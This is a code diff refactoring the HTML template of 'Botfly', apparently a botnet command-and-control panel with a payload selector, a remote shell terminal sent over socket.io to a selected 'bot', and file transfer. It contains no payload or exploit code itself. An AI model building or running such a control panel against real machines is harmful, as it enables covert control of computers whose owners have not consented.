@@ -1,53 +1,18 @@
 <!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="utf-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-    <meta name="description" content="">
-    <meta name="author" content="">
-
-    <title>Botfly</title>
-
-    <!-- Bootstrap Core CSS -->
-    <link href="../static/css/bootstrap.min.css" rel="stylesheet">
-
-    <!-- Custom CSS -->
-    <link rel="stylesheet" type="text/css" href="{{ url_for('static', filename='css/custom.css') }}">
-
-    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.min.js"></script>
-    <script src="http://code.jquery.com/ui/1.9.2/jquery-ui.js"></script>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.terminal/0.10.12/js/jquery.terminal.min.js"></script>
-    <script type="text/javascript"
-            src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/1.3.5/socket.io.min.js"></script>
-
-    <script type="text/javascript"
-            src="{{ url_for('static', filename='js/cookie.js') }}"></script>
-    <script type="text/javascript"
-            src="{{ url_for('static', filename='js/hotkeys.js') }}"></script>
-    <script type="text/javascript"
-            src="{{ url_for('static', filename='js/shared.js') }}"></script>
-
-    <link href="{{ url_for('static', filename='css/finder.css') }}" rel="stylesheet"/>
-    <link href="https://cdnjs.cloudflare.com/ajax/libs/jquery.terminal/0.10.12/css/jquery.terminal.min.css"
-          rel="stylesheet"/>
-
-</head>
-<body>
-
-
+<html>
+{% include 'header.html' %}
 {% include 'nav.html' %}
+<body>
 <!-- Page Content -->
 <div class="container">
     <div class="row">
         <div class="col-md-3">
             <ul>
-
                 <div class="input-group">
                     <select id="payload" name="payload" class="form-control">
                         <option>Select payload..</option>
                         {% for payload in payload_list %}
-                        <option value="{{ payload }}">{{ payload }}</option>
+                            <option value="{{ payload }}">{{ payload }}</option>
                         {% endfor %}
                     </select>
                 <span class="input-group-btn">
@@ -78,142 +43,42 @@
     <!-- /.row -->
 </div>
 <!-- /.container -->
-
 <script>
-    terminalFontSize = 14;
-    terminalMargin = 2;
-    $(document).ready(function () {
-        $('head').append('<style id="terminalFont" type="text/css">.terminal-output, .cmd {font-size:' + terminalFontSize + 'px;}</style>');
-        $('head').append('<style id="terminalMargin" type="text/css">.terminal div {margin-bottom:' + terminalMargin + 'px;}</style>');
 
-        //sets the terminal text color and font-size
-        function textStyle(message) {
-            return "[[;#90b1e5;black]" + message + "]";
+    terminal = $('#terminal').terminal(function (command, term) {
+        //no bot selected
+        if ('{{connected}}' == '') {
+            terminal.error('No bot selected.');
+            return;
+        }
+        if (command == 'clear') {
+            term.clear();
         }
 
-        hotkeys('command+=, command+-', function (event, handler) {
-            switch (handler.key) {
-                case "command+=":
-                    terminalMargin += .15;
-                    terminalFontSize += .2;
-                    break;
-                case "command+-":
-                    terminalMargin -= .15;
-                    terminalFontSize -= .2;
-                    break;
-            }
-            $('#terminalFont').text('.terminal-output, .cmd {font-size:' + terminalFontSize + 'px;}');
-            $('#terminalMargin').text('.terminal div {margin-bottom:' + terminalMargin + 'px;}');
-        });
-
-        terminal = $('#terminal').terminal(function (command, term) {
-            //no bot selected
-            if ('{{connected}}' == '') {
-                terminal.error('No bot selected.');
-                return;
-            }
-            if (command == 'clear') {
-                term.clear();
-            }
-
-            //download file from bot
-//            var splitCommand = command.split(" ");
-//            if (splitCommand[0] == "download") {
-//                if (splitCommand.length != 2) {
-//                    term.error("usage: download <filename>")
-//                }
-//                downloadFile(splitCommand[1]);
-//                return;
-//            }
-
-            //send terminal command to server
-            socket.emit('send_command', {data: command});
-            socket.removeAllListeners('send_command'); //Sloppy, fix this if can. should be outside terminal function ideally
-        }, {
-            greetings: 'Botfly Terminal',
-            height: 800,
-            width: 800,
-            //update prompt to be name of current user
-            prompt: function (callback) {
-                callback('{{connected}}> ');
-            }
-        });
-
-        socket.on('response', function (msg) {
-            //error returned from bot
-            if (msg.user === getCookie('bot')) {
-                console.log(msg);
-                if (msg.printout != '') {
-                    // TODO: change text color?
-                    terminal.echo(textStyle(msg.printout));
-                }
-                if (msg.errout != '') {
-                    // TODO: change text color?
-                    terminal.error(msg.errout);
-                }
-                if (msg.stderr != '') {
-                    terminal.error(msg.stderr);
-                }
-                if (msg.stdout != "Server generated event" && msg.stdout != '') {
-                    terminal.echo(textStyle(msg.stdout));
-                }
-            }
-        });
-
-        //success message received from server
-        socket.on('success', function (msg) {
-            terminal.echo(textStyle(msg.message))
-        });
-
-
-        //upload a file to the server
-        $(function () {
-            $('#upload-file').change(function () {
-                //no bot selected
-                if ('{{connected}}' == '') {
-                    terminal.error('No bot selected.');
-                    return;
-                }
-                var form_data = new FormData($('#upload-file')[0]);
-                $.ajax({
-                    type: 'POST',
-                    url: '/uploader',
-                    data: form_data,
-                    contentType: false,
-                    cache: false,
-                    processData: false,
-                    success: function (data) {
-                        if (JSON.parse(data).success) {
-                            terminal.echo(textStyle("File upload in progress..."))
-                        } else {
-                            terminal.error(textStyle("File upload failed"))
-                        }
-                    },
-                });
-            });
-        });
-
-        //launch payload
-        $(function () {
-            $("#send_payload").click(function (e) {
-                var value = $('#payload').val();
-                if (value != 'Select payload..' && $.cookie("bot") != '') {
-                    $.ajax({
-                        type: "POST",
-                        url: "/payload",
-                        data: {
-                            payload: value
-                        },
-                        success: function (data) {
-                            console.log(data)
-                        }
-                    });
-                }
-            });
-        });
+        //send terminal command to server
+        socket.emit('send_command', {data: command});
+        socket.removeAllListeners('send_command'); //Sloppy, fix this if can. should be outside terminal function ideally
+    }, {
+        greetings: 'Botfly Terminal',
+        height: 800,
+        width: 800,
+        //update prompt to be name of current user
+        prompt: function (callback) {
+            callback('{{connected}}> ');
+        }
     });
+
+    //    $("#downloads").click(function () {
+    //        if ($(this).parent().hasClass('open')) {
+    //            $(this).parent().removeClass('open');
+    //        } else {
+    //            $('.dropdown-toggle').dropdown();
+    //        }
+    //    });
+
 </script>
 
+<script src="{{ url_for('static', filename='js/index.js') }}"></script>
 
 </body>
 </html>
